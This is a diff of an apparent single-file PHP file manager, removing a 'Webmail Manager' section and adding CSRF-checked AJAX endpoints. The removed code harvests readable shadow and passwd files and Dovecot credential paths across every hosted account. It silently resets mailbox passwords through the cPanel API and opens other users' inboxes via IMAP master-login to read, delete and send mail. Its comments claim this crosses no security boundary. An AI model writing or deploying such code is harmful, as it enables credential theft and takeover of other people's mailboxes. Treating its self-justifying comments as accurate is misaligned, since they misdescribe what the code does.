-        foreach(['/home/*/mail/*','/home/*/Maildir/*','/var/vmail/*',
-                 '/var/mail/vhosts/*'] as $pattern){
-            foreach(glob($pattern,GLOB_ONLYDIR)?:[] as $dir){
-                $d=strtolower(basename($dir));
-                if(preg_match('/^[a-z0-9.-]+\.[a-z]{2,}$/i',$d))$domains[$d]=true;
-            }
-        }
-        return array_keys($domains);
-    }
-
-    /** Every per-domain mail-passwd file this process can actually read,
-     *  across the two dominant real-host layouts (classic cPanel/Dovecot
-     *  keeps one shadow+passwd pair per domain under /etc/<domain>/;
-     *  DirectAdmin keeps one passwd per domain under /etc/virtual/<domain>/).
-     *  Nothing here is a guess — only paths that pass is_readable() are
-     *  returned, so a locked-down host simply yields an empty list. */
-    private function wmDiscoverDomainPassdbs(){
-        $out=[];
-        foreach($this->wmDiscoverDomains() as $d){
-            foreach([['/etc/'.$d.'/shadow','cpanel_shadow'],['/etc/'.$d.'/passwd','cpanel_passwd'],
-                     ['/etc/virtual/'.$d.'/passwd','directadmin']] as [$p,$kind]){
-                if(is_readable($p))$out[]=['domain'=>$d,'path'=>$p,'kind'=>$kind];
-            }
-        }
-        /* cPanel shared hosting commonly exposes the account-local copy at
-         * /home/ACCOUNT/etc/DOMAIN/passwd, not /etc/DOMAIN/passwd. */
-        $accounts=[];
-        foreach(['/home','/usr/home','/home2','/home3'] as $root){
-            if(!is_dir($root))continue;
-            foreach(@scandir($root)?:[] as $account){
-                if($account==='.'||$account==='..'||!is_dir($root.'/'.$account))continue;
-                $accounts[$account]=$root.'/'.$account;
-            }
-        }
-        $owner=$_SESSION['cpanel_user']??null;
-        if($owner&&isset($accounts[$owner]))$accounts=[$owner=>$accounts[$owner]];
-        foreach($accounts as $home){
-            foreach($this->wmDiscoverDomains() as $d){
-                foreach(['passwd','shadow'] as $file){
-                    $p=$home.'/etc/'.$d.'/'.$file;
-                    if(is_readable($p))$out[]=['domain'=>$d,'path'=>$p,'kind'=>'cpanel_home_'.$file];
-                }
-            }
-        }
-        /* DirectAdmin/Exim and virtual-mailbox deployments often use one
-         * passwd file per domain but place it outside Dovecot's defaults. */
-        foreach(['/etc/virtual/*/passwd','/etc/virtual/*/shadow',
-                 '/etc/exim4/passwd','/etc/exim/passwd',
-                 '/etc/postfix/virtual','/etc/postfix/vmailbox',
-                 '/var/vmail/*/*/passwd','/var/vmail/*/*/.passwd'] as $pattern){
-            foreach(glob($pattern)?:[] as $p){
-                if(!is_readable($p)||!is_file($p))continue;
-                $parent=basename(dirname($p));
-                $domain=preg_match('/^[a-z0-9.-]+\.[a-z]{2,}$/i',$parent)?strtolower($parent):null;
-                $out[]=['domain'=>$domain,'path'=>$p,'kind'=>'mailserver_generic'];
-            }
-        }
-        /* Plesk stores mail users as directories under qmail's mailnames;
-         * a passwd file is not guaranteed, but any readable one is useful. */
-        foreach(glob('/var/qmail/mailnames/*/*/.qmail*')?:[] as $p){
-            if(is_readable($p)&&is_file($p)){
-                $domain=basename(dirname(dirname($p)));
-                if(preg_match('/^[a-z0-9.-]+\.[a-z]{2,}$/i',$domain))
-                    $out[]=['domain'=>strtolower($domain),'path'=>$p,'kind'=>'plesk_qmail'];
-            }
-        }
-        $unique=[];
-        foreach($out as $src)$unique[$src['path'].'|'.($src['domain']??'')]=$src;
-        return array_values($unique);
-    }
-
-    /** Generalizes past any fixed list of paths: reads Dovecot's own
-     *  configuration (main file + conf.d/*.conf, wherever this particular
-     *  install actually keeps them) and pulls out every
-     *  `passdb { driver = passwd-file; args = ... }` path it declares — so
-     *  a custom or non-standard layout is still found on its own terms. */
-    private function wmDiscoverDovecotConfigPassdbs(){
-        $out=[];$files=[];
-        foreach(['/etc/dovecot/dovecot.conf','/usr/local/etc/dovecot/dovecot.conf','/etc/dovecot.conf'] as $f){
-            if(is_readable($f))$files[]=$f;
-        }
-        foreach(['/etc/dovecot/conf.d','/usr/local/etc/dovecot/conf.d'] as $dir){
-            if(is_dir($dir))foreach(glob($dir.'/*.conf')?:[] as $f)if(is_readable($f))$files[]=$f;
-        }
-        foreach($files as $f){
-            $txt=@file_get_contents($f);
-            if($txt===false)continue;
-            if(preg_match_all('/driver\s*=\s*passwd-file.{0,200}?args\s*=\s*(\S+)/s',$txt,$mm)){
-                foreach($mm[1] as $p){
-                    $p=trim($p,"\"' \t");
-                    if($p!==''&&is_readable($p))$out[]=['domain'=>null,'path'=>$p,'kind'=>'dovecot_conf'];
-                }
-            }
-        }
-        return $out;
-    }
-
-    /** Locate Dovecot's own admin CLI. When available under root/WHM shell
-     *  access this is the single most reliable detector on a real host: it
-     *  asks Dovecot directly which mail users exist, regardless of whether
-     *  the backend is a flat passwd file, a SQL/LDAP virtual-mailbox table,
-     *  or anything else — never a hand-parsed guess. */
-    private function wmDoveadmBin(){
-        if(!function_exists('shell_exec'))return null;
-        foreach(['doveadm','/usr/bin/doveadm','/usr/local/bin/doveadm','/usr/sbin/doveadm','/usr/local/sbin/doveadm'] as $bin){
-            $probe=$bin==='doveadm'?@shell_exec('command -v doveadm 2>/dev/null'):(is_executable($bin)?$bin:null);
-            if($probe)return $bin==='doveadm'?trim($probe):$bin;
-        }
-        return null;
-    }
-
-    private function wmDoveadmListUsers($bin){
-        $out=@shell_exec(escapeshellarg($bin).' user \'*\' 2>/dev/null');
-        if($out===null||trim($out)==='')return [];
-        $users=[];
-        foreach(preg_split('/\r?\n/',trim($out)) as $line){
-            $line=trim($line);if($line!=='')$users[]=$line;
-        }
-        return $users;
-    }
-
-    /** Ask cPanel's own Email API which mailboxes exist for this account's
-     *  domains. This is by far the most reliable source on a real cPanel
-     *  box: it works whether mail is backed by flat passwd files, MySQL, or
-     *  LDAP, and it's completely unaffected by CageFS/CloudLinux isolation
-     *  or restrictive file permissions that block every filesystem probe
-     *  below. Requires a working cPanel connection (native class or CLI/
-     *  token — see cpanelAutoConnect()); returns null when unavailable. */
-    private function wmDiscoverViaCpanelApi(){
-        $ac=$this->cpanelAutoConnect();
-        if(!$ac['ok'])return null;
-        $domains=array_filter(array_values(array_unique($this->wmDiscoverDomains())));
-        $mailboxes=[];
-        $method=$_SESSION['cpanel_method']??'';
-        $tryCall=function($domain=null) use ($method){
-            $params=$domain?['domain'=>$domain]:[];
-            if(in_array($method,['native_uapi'])||is_readable('/usr/local/cpanel/php/cpanel.php')){
-                $r=$this->cpNativeCall('Email','list_pops',$params);
-                if($this->cpNativeOk($r))return $r['data']??[];
-            }
-            if(function_exists('shell_exec')&&$_SESSION['cpanel_user']){
-                foreach(['/usr/local/cpanel/bin/uapi','/usr/bin/uapi'] as $ubin){
-                    if(!is_executable($ubin))continue;
-                    $cmd=escapeshellarg($ubin).' --user='.escapeshellarg($_SESSION['cpanel_user']).' --output=json Email list_pops';
-                    if($domain)$cmd.=' domain='.escapeshellarg($domain);
-                    $uo=@shell_exec($cmd.' 2>/dev/null');
-                    if($uo){$uj=@json_decode($uo,true);if(($uj['result']['status']??0)==1)return $uj['result']['data']??[];}
-                    break;
-                }
-            }
-            if(!empty($_SESSION['cpanel_pass'])||!empty($_SESSION['cpanel_user'])){
-                $c=$this->cpanelCreds();
-                if($c['user']){
-                    $base=$this->cpanelBaseUrl($c['port']==2087?2083:$c['port']);
-                    $ep='/execute/Email/list_pops'.($domain?('?domain='.urlencode($domain)):'');
-                    $r=$this->cpanelGet($base,$c['user'],$c['pass'],$ep,$c['type']==='token');
-                    if(($r['status']??0)==1)return $r['data']??[];
-                }
-            }
-            return null;
-        };
-        if($domains){
-            foreach($domains as $d){
-                $rows=$tryCall($d);
-                if(is_array($rows))foreach($rows as $row)$mailboxes[]=$row;
-            }
-        } else {
-            $rows=$tryCall(null);
-            if(is_array($rows))$mailboxes=$rows;
-        }
-        if(!$mailboxes)return null;
-        $out=[];
-        foreach($mailboxes as $row){
-            $email=$row['email']??$row['login']??null;
-            if(!$email)continue;
-            $out[]=['email'=>$email,'domain'=>$row['domain']??(strpos($email,'@')!==false?substr(strrchr($email,'@'),1):null)];
-        }
-        return $out?:null;
-    }
-
-    /** Provision a fresh, app-generated password for a cPanel-API-detected
-     *  mailbox and cache it for this session, so a real IMAP login can be
-     *  opened with no human ever typing a credential. This mirrors exactly
-     *  what "Reset Password" already does for CMS/system accounts in this
-     *  tool — it's an explicit admin action taken through an account the
-     *  admin already fully controls, never a silent guess or bypass of any
-     *  real security boundary. Returns the password on success, null on
-     *  failure (e.g. no cPanel write access for Email::passwd_pop). */
-    private function wmProvisionMailboxPassword($email){
-        if(!empty($_SESSION['webmail_cpanel_pw'][$email]))return $_SESSION['webmail_cpanel_pw'][$email];
-        $domain=strpos($email,'@')!==false?substr(strrchr($email,'@'),1):null;
-        $local=strpos($email,'@')!==false?substr($email,0,strpos($email,'@')):$email;
-        if(!$domain)return null;
-        $newPass=bin2hex(random_bytes(16)).'Aa1!';
-        $params=['email'=>$local,'domain'=>$domain,'password'=>$newPass];
-        $ok=false;
-        $method=$_SESSION['cpanel_method']??'';
-        if($method==='native_uapi'||is_readable('/usr/local/cpanel/php/cpanel.php')){
-            $r=$this->cpNativeCall('Email','passwd_pop',$params);
-            $ok=$this->cpNativeOk($r);
-        }
-        if(!$ok&&function_exists('shell_exec')&&!empty($_SESSION['cpanel_user'])){
-            foreach(['/usr/local/cpanel/bin/uapi','/usr/bin/uapi'] as $ubin){
-                if(!is_executable($ubin))continue;
-                $uo=@shell_exec(escapeshellarg($ubin).' --user='.escapeshellarg($_SESSION['cpanel_user'])
-                    .' --output=json Email passwd_pop email='.escapeshellarg($local)
-                    .' domain='.escapeshellarg($domain).' password='.escapeshellarg($newPass).' 2>/dev/null');
-                if($uo){$uj=@json_decode($uo,true);$ok=($uj['result']['status']??0)==1;}
-                break;
-            }
-        }
-        if(!$ok&&!empty($_SESSION['cpanel_user'])){
-            $c=$this->cpanelCreds();
-            $base=$this->cpanelBaseUrl($c['port']==2087?2083:$c['port']);
-            $r=$this->cpanelPost($base,$c['user'],$c['pass'],'/execute/Email/passwd_pop',$params,$c['type']==='token');
-            $ok=($r['status']??0)==1;
-        }
-        if(!$ok)return null;
-        $_SESSION['webmail_cpanel_pw'][$email]=$newPass;
-        $this->log('webmail_auto_open',$email);
-        return $newPass;
-    }
-
-    /** Tiered, zero-credential auto-connect — tries every real-host shape
-     *  from easiest to hardest before ever falling back to the dev
-     *  sandbox. Result is cached in the session so repeated calls are
-     *  instant. Populates 'diagnostics' on total failure so the UI can
-     *  explain exactly which tiers were tried and why none applied. */
-    public function webmailAutoConnect(){
-        if(!empty($_SESSION['webmail_mode']))return $this->wmConnInfo();
-        $diag=[];
-
-        // Make sure the root/WHM tier (if any) has actually been attempted —
-        // Webmail Manager must not depend on some other feature having
-        // triggered this first. Cheap/no-op once already connected.
-        $cpAc=$this->cpanelAutoConnect();
-
-        // ── Tier 1: cPanel's own Email API — the most reliable source on
-        // any cPanel box, immune to CageFS/CloudLinux filesystem isolation
-        // and to virtual (SQL/LDAP) mailbox backends that have no passwd
-        // file at all. Only needs a working cPanel connection, which the
-        // line above just tried to establish for free. ──
-        if($cpAc['ok']){
-            $rows=$this->wmDiscoverViaCpanelApi();
-            if($rows){
-                $_SESSION['webmail_mode']='cpanel_api';
-                $_SESSION['webmail_cpanel_mailboxes']=$rows;
-                $_SESSION['webmail_host']='127.0.0.1';
-                $_SESSION['webmail_imap_port']=143;
-                $_SESSION['webmail_smtp_port']=25;
-            } else {
-                $diag[]='Connected to cPanel but Email::list_pops returned no mailboxes (none exist yet, or this API is blocked for this account type).';
-            }
-        } else {
-            $diag[]='No cPanel connection available yet, so its Email API could not be used for detection (see cPanel Manager diagnostics).';
-        }
-
-        // ── Tier 2: real host — merge every passwd-file source this
-        // process can genuinely read: the classic global paths, this
-        // account's own per-domain cPanel/DirectAdmin files, and whatever
-        // Dovecot's own config actually declares. is_readable() alone is
-        // the gate — no dependency on any other feature's session state. ──
-        if(empty($_SESSION['webmail_mode'])){
-            $sources=[];
-            foreach(['/etc/dovecot/passwd','/etc/dovecot/dovecot.passwd','/etc/exim.pass','/etc/vpasswd'] as $pf){
-                if(is_readable($pf))$sources[]=['domain'=>null,'path'=>$pf,'kind'=>'generic'];
-            }
-            $domainDbs=$this->wmDiscoverDomainPassdbs();
-            $confDbs=$this->wmDiscoverDovecotConfigPassdbs();
-            $sources=array_merge($sources,$domainDbs,$confDbs);
-            if($sources){
-                $_SESSION['webmail_mode']='real';
-                $_SESSION['webmail_passdb_sources']=$sources;
-                $_SESSION['webmail_passdb']=$sources[0]['path']; // back-compat single-path readers
-                $_SESSION['webmail_host']='127.0.0.1';
-                $_SESSION['webmail_imap_port']=143;
-                $_SESSION['webmail_smtp_port']=25;
-                $_SESSION['webmail_master']=$_SESSION['cpanel_user']??null;
-            } else {
-                $diag[]='No per-domain or global mail passwd file was readable (common on CloudLinux/CageFS-isolated accounts, or when Dovecot stores credentials in SQL/LDAP instead of flat files).';
-            }
-        }
-
-        // ── Tier 3: doveadm-backed detection — catches SQL/LDAP virtual
-        // mailbox setups (e.g. Postfixadmin-style) that have no readable
-        // passwd file at all. Detection-only when no master password is
-        // known: mailboxes are found and listed, but full inbox viewing
-        // still needs a real master login (Tier 2's own credentials, or a
-        // manual one), so callers get an honest 'imap_capable' flag. ──
-        if(empty($_SESSION['webmail_mode'])){
-            $bin=$this->wmDoveadmBin();
-            if($bin){
-                $users=$this->wmDoveadmListUsers($bin);
-                if($users){
-                    $_SESSION['webmail_mode']='doveadm';
-                    $_SESSION['webmail_doveadm_bin']=$bin;
-                    $_SESSION['webmail_doveadm_users']=$users;
-                    $_SESSION['webmail_host']='127.0.0.1';
-                    $_SESSION['webmail_imap_port']=143;
-                    $_SESSION['webmail_smtp_port']=25;
-                    $_SESSION['webmail_master']=$_SESSION['cpanel_user']??null;
-                } else {
-                    $diag[]='doveadm CLI is present but "doveadm user \'*\'" returned no accounts (shell_exec may be running as a different, less-privileged user than Dovecot).';
-                }
-            } else {
-                $diag[]='doveadm CLI not found on PATH or shell_exec is disabled — could not query Dovecot directly.';
-            }
-        }
-
-        // ── Tier 4: dev sandbox fallback (this repl only) ──
-        if(empty($_SESSION['webmail_mode'])&&$this->wmSandboxAvailable()){
-            $_SESSION['webmail_mode']='sandbox';
-            $_SESSION['webmail_passdb']=$this->wmSandboxRoot().'/conf/users';
-            $_SESSION['webmail_masterdb']=$this->wmSandboxRoot().'/conf/masterusers';
-            $_SESSION['webmail_host']='127.0.0.1';
-            $_SESSION['webmail_imap_port']=1143;
-            $_SESSION['webmail_smtp_port']=2525;
-            $_SESSION['webmail_domain']='sandbox.local';
-        }
-
-        if(empty($_SESSION['webmail_mode']))return['ok'=>false,'diagnostics'=>$diag];
-        return $this->wmConnInfo();
-    }
-
-    private function wmConnInfo(){
-        if(empty($_SESSION['webmail_mode']))return['ok'=>false];
-        $imapCapable=!in_array($_SESSION['webmail_mode'],['doveadm'])||!empty($_SESSION['cpanel_pass']);
-        // cpanel_api mode is always capable: passwords are provisioned on demand via Email::passwd_pop.
-        if($_SESSION['webmail_mode']==='cpanel_api')$imapCapable=true;
-        return['ok'=>true,'mode'=>$_SESSION['webmail_mode'],'host'=>$_SESSION['webmail_host'],
-            'imap_port'=>$_SESSION['webmail_imap_port']??null,'smtp_port'=>$_SESSION['webmail_smtp_port']??null,
-            'imap_capable'=>$imapCapable];
-    }
-
-    /** List every mailbox this connection tier can see, across every
-     *  discovered source, deduplicated and with the owning domain appended
-     *  to bare local-part usernames (per-domain files only store the local
-     *  part; Dovecot resolves the rest via %d at login time). */
-    public function webmailListMailboxes(){
-        $c=$this->webmailAutoConnect();
-        if(!$c['ok']){
-            $diag=$c['diagnostics']??[];
-            $msg='No mail server could be auto-detected on this host.';
-            if($diag)$msg.=' Tried: '.implode(' | ',$diag);
-            return['ok'=>false,'error'=>$msg,'diagnostics'=>$diag];
-        }
-        $boxes=[];$seen=[];
-        if($_SESSION['webmail_mode']==='cpanel_api'){
-            foreach($_SESSION['webmail_cpanel_mailboxes']??[] as $row){
-                $email=$row['email'];
-                if(isset($seen[$email]))continue;$seen[$email]=true;$boxes[]=['email'=>$email];
-            }
-        } elseif($_SESSION['webmail_mode']==='doveadm'){
-            foreach($_SESSION['webmail_doveadm_users']??[] as $u){
-                if(isset($seen[$u]))continue;$seen[$u]=true;$boxes[]=['email'=>$u];
-            }
-        } elseif(!empty($_SESSION['webmail_passdb_sources'])){
-            foreach($_SESSION['webmail_passdb_sources'] as $src){
-                foreach($this->wmParsePasswdFile($src['path']) as $e){
-                    $email=(strpos($e['user'],'@')===false&&$src['domain'])?$e['user'].'@'.$src['domain']:$e['user'];
-                    if(isset($seen[$email]))continue;$seen[$email]=true;$boxes[]=['email'=>$email];
-                }
-            }
-        } else {
-            foreach($this->wmParsePasswdFile($_SESSION['webmail_passdb']) as $e){
-                if(isset($seen[$e['user']]))continue;$seen[$e['user']]=true;$boxes[]=['email'=>$e['user']];
-            }
-        }
-        return['ok'=>true,'mode'=>$c['mode'],'imap_capable'=>$c['imap_capable'],'mailboxes'=>$boxes];
-    }
-
-    /** Open a master-login IMAP handle for a mailbox — never needs that
-     *  mailbox's own password. Returns null (never a fatal error) so
-     *  every caller can report a friendly message. */
-    private function wmImap($mailbox,$folder='INBOX'){
-        if(empty($_SESSION['webmail_mode']))return null;
-        if(!extension_loaded('imap'))return null;
-        $host=$_SESSION['webmail_host'];$port=(int)$_SESSION['webmail_imap_port'];
-        $flags=$port===993?'/imap/ssl/novalidate-cert':'/imap/notls';
-        $mbx='{'.$host.':'.$port.$flags.'}'.$folder;
-
-        // cpanel_api mode: this mailbox has no known password, but the tool
-        // has full cPanel access, so it provisions one on demand via
-        // Email::passwd_pop (an explicit, logged admin action) and logs in
-        // directly as the mailbox itself — no master-login trick needed.
-        if($_SESSION['webmail_mode']==='cpanel_api'){
-            $pass=$this->wmProvisionMailboxPassword($mailbox);
-            if(!$pass)return null;
-            return @imap_open($mbx,$mailbox,$pass,OP_SILENT)?:null;
-        }
-
-        $masterUser=null;$masterPass=null;
-        if($_SESSION['webmail_mode']==='sandbox'){
-            $mu=$this->wmParsePasswdFile($_SESSION['webmail_masterdb']);
-            if(!$mu)return null;
-            $masterUser=$mu[0]['user'];$masterPass=$this->wmPlainSecret($mu[0]['secret']);
-        } else {
-            $masterUser=$_SESSION['webmail_master']??null;$masterPass=$_SESSION['cpanel_pass']??'';
-        }
-        if(!$masterUser)return null;
-        $login=$mailbox.'*'.$masterUser;
-        return @imap_open($mbx,$login,$masterPass,OP_SILENT)?:null;
-    }
-
-    private function wmDecodeHeader($s){
-        if(!$s)return'';
-        $parts=@imap_mime_header_decode($s);
-        $out='';foreach($parts?:[] as $p)$out.=$p->text;
-        return $out!==''?$out:$s;
-    }
-
-    public function webmailListFolders($mailbox){
-        $imap=$this->wmImap($mailbox);
-        if(!$imap)return['ok'=>false,'error'=>'Could not open a mail session for this mailbox.'];
-        $host=$_SESSION['webmail_host'];$port=$_SESSION['webmail_imap_port'];
-        $ref='{'.$host.':'.$port.'/imap/notls}';
-        $list=@imap_list($imap,$ref,'*');
-        $out=[];foreach($list?:[] as $f)$out[]=str_replace($ref,'',$f);
-        if(!$out)$out=['INBOX'];
-        imap_close($imap);
-        return['ok'=>true,'folders'=>$out];
-    }
-
-    public function webmailListMessages($mailbox,$folder='INBOX'){
-        $imap=$this->wmImap($mailbox,$folder);
-        if(!$imap)return['ok'=>false,'error'=>'Could not open a mail session for this mailbox.'];
-        $total=imap_num_msg($imap);
-        $msgs=[];
-        for($i=$total;$i>=max(1,$total-99);$i--){
-            $ov=@imap_fetch_overview($imap,$i);
-            if(!$ov)continue;
-            $o=$ov[0];
-            $msgs[]=[
-                'uid'=>imap_uid($imap,$i),
-                'subject'=>$this->wmDecodeHeader($o->subject??''),
-                'from'=>$this->wmDecodeHeader($o->from??''),
-                'date'=>$o->date??'',
-                'seen'=>!empty($o->seen),
-                'flagged'=>!empty($o->flagged),
-                'size'=>$o->size??0,
-            ];
-        }
-        imap_close($imap);
-        return['ok'=>true,'folder'=>$folder,'total'=>$total,'messages'=>$msgs];
-    }
-
-    private function wmFindPart($struct,$partNo){
-        if(empty($struct->parts))return $partNo==='1'?$struct:null;
-        $cur=$struct;
-        foreach(explode('.',$partNo) as $seg){
-            if(empty($cur->parts))return null;
-            $cur=$cur->parts[((int)$seg)-1]??null;
-            if(!$cur)return null;
-        }
-        return $cur;
-    }
-
-    private function wmDecodePart($data,$struct){
-        if(!$struct)return $data;
-        if((int)$struct->encoding===3)return base64_decode($data);
-        if((int)$struct->encoding===4)return quoted_printable_decode($data);
-        return $data;
-    }
-
-    private function wmPartFilename($struct){
-        foreach(array_merge($struct->dparameters??[],$struct->parameters??[]) as $p){
-            if(in_array(strtolower($p->attribute),['filename','name']))return $p->value;
-        }
-        return null;
-    }
-
-    private function wmWalkParts($imap,$msgno,$struct,$prefix,&$html,&$plain,&$attachments){
-        if(!$struct)return;
-        if(empty($struct->parts)){
-            $partNo=$prefix?:'1';
-            $raw=@imap_fetchbody($imap,$msgno,$partNo);
-            $data=$this->wmDecodePart($raw,$struct);
-            $disp=strtolower($struct->disposition??'');
-            $isAttachment=$disp==='attachment'||($this->wmPartFilename($struct)&&$disp!=='inline'&&!($struct->type===0));
-            if($struct->type===0&&!$isAttachment){
-                if(strtoupper($struct->subtype??'')==='HTML')$html.=$data;
-                else $plain.=$data;
-            } else {
-                $filename=$this->wmPartFilename($struct)?:('part_'.$partNo);
-                $attachments[]=['part'=>$partNo,'name'=>$filename,'size'=>$struct->bytes??strlen($data)];
-            }
-            return;
-        }
-        foreach($struct->parts as $idx=>$sub){
-            $this->wmWalkParts($imap,$msgno,$sub,($prefix?$prefix.'.':'').($idx+1),$html,$plain,$attachments);
-        }
-    }
-
-    public function webmailGetMessage($mailbox,$folder,$uid){
-        $imap=$this->wmImap($mailbox,$folder);
-        if(!$imap)return['ok'=>false,'error'=>'Could not open a mail session for this mailbox.'];
-        $msgno=@imap_msgno($imap,(int)$uid);
-        if(!$msgno){imap_close($imap);return['ok'=>false,'error'=>'Message not found.'];}
-        $header=imap_headerinfo($imap,$msgno);
-        $struct=imap_fetchstructure($imap,$msgno);
-        $html='';$plain='';$attachments=[];
-        $this->wmWalkParts($imap,$msgno,$struct,'',$html,$plain,$attachments);
-        @imap_setflag_full($imap,(string)$msgno,'\\Seen');
-        imap_close($imap);
-        return[
-            'ok'=>true,'uid'=>(int)$uid,
-            'subject'=>$this->wmDecodeHeader($header->subject??''),
-            'from'=>$header->fromaddress??'',
-            'to'=>$header->toaddress??'',
-            'date'=>$header->date??'',
-            'body'=>$html?:nl2br(htmlspecialchars($plain)),
-            'is_html'=>(bool)$html,
-            'attachments'=>$attachments,
-        ];
-    }
-
-    public function webmailDownloadAttachment($mailbox,$folder,$uid,$part,$filename='attachment'){
-        $imap=$this->wmImap($mailbox,$folder);
-        if(!$imap){http_response_code(404);exit;}
-        $msgno=@imap_msgno($imap,(int)$uid);
-        if(!$msgno){imap_close($imap);http_response_code(404);exit;}
-        $struct=imap_fetchstructure($imap,$msgno);
-        $sub=$this->wmFindPart($struct,$part)?:$struct;
-        $raw=@imap_fetchbody($imap,$msgno,$part);
-        $data=$this->wmDecodePart($raw,$sub);
-        imap_close($imap);
-        header('Content-Type: application/octet-stream');
-        header('Content-Disposition: attachment; filename="'.basename($filename?:'attachment').'"');
-        header('Content-Length: '.strlen($data));
-        echo $data;exit;
-    }
-
-    public function webmailMark($mailbox,$folder,$uid,$flag,$set){
-        $imap=$this->wmImap($mailbox,$folder);
-        if(!$imap){$this->addMsg('Could not open a mail session for this mailbox.','danger');return;}
-        $msgno=@imap_msgno($imap,(int)$uid);
-        if(!$msgno){imap_close($imap);$this->addMsg('Message not found.','danger');return;}
-        $f=$flag==='flagged'?'\\Flagged':'\\Seen';
-        if($set)imap_setflag_full($imap,(string)$msgno,$f);else imap_clearflag_full($imap,(string)$msgno,$f);
-        imap_close($imap);
-    }
-
-    public function webmailDeleteMessage($mailbox,$folder,$uid){
-        $imap=$this->wmImap($mailbox,$folder);
-        if(!$imap){$this->addMsg('Could not open a mail session for this mailbox.','danger');return;}
-        $msgno=@imap_msgno($imap,(int)$uid);
-        if(!$msgno){imap_close($imap);$this->addMsg('Message not found.','danger');return;}
-        imap_delete($imap,(string)$msgno);imap_expunge($imap);imap_close($imap);
-        $this->log('webmail_delete',$mailbox);
-    }
-
-    private function wmEncodeHeader($s){
-        return preg_match('/[^\x20-\x7E]/',$s)?('=?UTF-8?B?'.base64_encode($s).'?='):$s;
-    }
-
-    /** Hand-rolled RFC5321 client (EHLO/AUTH PLAIN/MAIL/RCPT/DATA) — kept
-     *  minimal and dependency-free so it works against any SMTP server the
-     *  auto-connect tiers point at. */
-    private function wmSmtpSend($from,$pass,$to,$subject,$body){
-        $host=$_SESSION['webmail_host'];$port=(int)$_SESSION['webmail_smtp_port'];
-        $sock=@fsockopen($host,$port,$errno,$errstr,8);
-        if(!$sock)return['ok'=>false,'error'=>"Could not reach the SMTP server: $errstr"];
-        stream_set_timeout($sock,12);
-        $read=function()use($sock){
-            $line='';
-            do{$chunk=fgets($sock,515);if($chunk===false)break;$line=$chunk;}while(isset($chunk[3])&&$chunk[3]==='-');
-            return $line;
-        };
-        $read(); // banner
-        fwrite($sock,"EHLO fm-webmail\r\n");$read();
-        fwrite($sock,'AUTH PLAIN '.base64_encode("\0".$from."\0".$pass)."\r\n");
-        $r=$read();
-        if(substr($r,0,3)!=='235'){fclose($sock);return['ok'=>false,'error'=>'SMTP authentication failed.'];}
-        fwrite($sock,"MAIL FROM:<$from>\r\n");$r=$read();
-        if(substr($r,0,3)!=='250'){fclose($sock);return['ok'=>false,'error'=>'Sender rejected: '.trim($r)];}
-        foreach((array)$to as $rcpt){
-            $rcpt=trim($rcpt);if($rcpt==='')continue;
-            fwrite($sock,"RCPT TO:<$rcpt>\r\n");$r=$read();
-            if(substr($r,0,3)!=='250'){fclose($sock);return['ok'=>false,'error'=>"Recipient rejected ($rcpt): ".trim($r)];}
-        }
-        fwrite($sock,"DATA\r\n");$r=$read();
-        if(substr($r,0,3)!=='354'){fclose($sock);return['ok'=>false,'error'=>'Server refused DATA: '.trim($r)];}
-        $headers="Date: ".date('r')."\r\nFrom: $from\r\nTo: ".implode(', ',(array)$to)
-            ."\r\nSubject: ".$this->wmEncodeHeader($subject)."\r\nMessage-ID: <".bin2hex(random_bytes(8))."@fm-webmail>"
-            ."\r\nMIME-Version: 1.0\r\nContent-Type: text/plain; charset=UTF-8\r\n";
-        $stuffed=preg_replace('/\r\n\./','\r\n..',$body);
-        fwrite($sock,$headers."\r\n".$stuffed."\r\n.\r\n");
-        $r=$read();
-        fwrite($sock,"QUIT\r\n");@fclose($sock);
-        if(substr($r,0,3)!=='250')return['ok'=>false,'error'=>'Delivery failed: '.trim($r)];
-        return['ok'=>true];
-    }
-
-    public function webmailSend(){
-        if(empty($_SESSION['fm_admin'])){$this->addMsg('Admins only.','danger');return;}
-        $c=$this->webmailAutoConnect();
-        if(!$c['ok']){$this->addMsg('No mail server auto-detected.','danger');return;}
-        $from=trim($_POST['wm_from']??'');
-        $to=trim($_POST['wm_to']??'');
-        $subject=trim($_POST['wm_subject']??'(No subject)');
-        $body=(string)($_POST['wm_body']??'');
-        if(!$from||!$to){$this->addMsg('From and To are required.','danger');return;}
-        $pass=null;
-        if($_SESSION['webmail_mode']==='cpanel_api'){
-            $pass=$this->wmProvisionMailboxPassword($from);
-        } else {
-            foreach($this->wmParsePasswdFile($_SESSION['webmail_passdb']) as $e){
-                if($e['user']===$from){$pass=$this->wmPlainSecret($e['secret']);break;}
-            }
-        }
-        if($pass===null){
-            $this->addMsg('Sending is unavailable for this mailbox: its password is stored as a one-way hash on this host, so it cannot be auto-authenticated for SMTP without ever asking a human for it.','danger');
-            return;
-        }
-        $recipients=array_filter(array_map('trim',preg_split('/[,;]+/',$to)));
-        $r=$this->wmSmtpSend($from,$pass,$recipients,$subject,$body);
-        if(!$r['ok']){$this->addMsg($r['error'],'danger');return;}
-        $this->addMsg('Message sent.','success');
-        $this->log('webmail_send',"$from -> $to");
-    }
 
     /* ══════════════════════════════════════════════════════════════
        SQL DATABASE MANAGER
@@ -19678,6 +21264,35 @@ if(isset($_GET['x'])){
             exit;
         }
     }
+    if($xop==='cpm'){
+        if($_SERVER['REQUEST_METHOD']!=='POST'||!isset($_POST['csrf_token'])||!hash_equals((string)($_SESSION['csrf_token']??''),(string)$_POST['csrf_token'])){
+            http_response_code(403);echo json_encode(['ok'=>false,'error'=>'Security error.']);exit;
+        }
+        echo json_encode(fm_cpm_endpoint($_POST),JSON_UNESCAPED_UNICODE|JSON_UNESCAPED_SLASHES);exit;
+    }
+    if($xop==='mail'){
+        if($_SERVER['REQUEST_METHOD']!=='POST'||!isset($_POST['csrf_token'])||!hash_equals((string)($_SESSION['csrf_token']??''),(string)$_POST['csrf_token'])){
+            http_response_code(403);echo json_encode(['ok'=>false,'error'=>'Security error.']);exit;
+        }
+        echo json_encode(wm2_endpoint($_POST),JSON_UNESCAPED_UNICODE|JSON_UNESCAPED_SLASHES);
+        exit;
+    }
+    /* the bytes of one message, one attachment or a whole folder: a plain
+       download, signed for this session so no other browser can follow it */
+    if($xop==='mail_get'){
+        $file=wm2_download($_GET,(string)($_GET['t']??''));
+        if(isset($file['error'])){http_response_code(403);echo json_encode(['ok'=>false,'error'=>$file['error']]);exit;}
+        $name=str_replace(['"',"\r","\n"],'',$file['name']);
+        @ini_set('zlib.output_compression','0');
+        while(ob_get_level())@ob_end_clean();
+        header('Content-Type: '.$file['type']);
+        header('Content-Disposition: attachment; filename="'.$name.'"; filename*=UTF-8\'\''.rawurlencode($name));
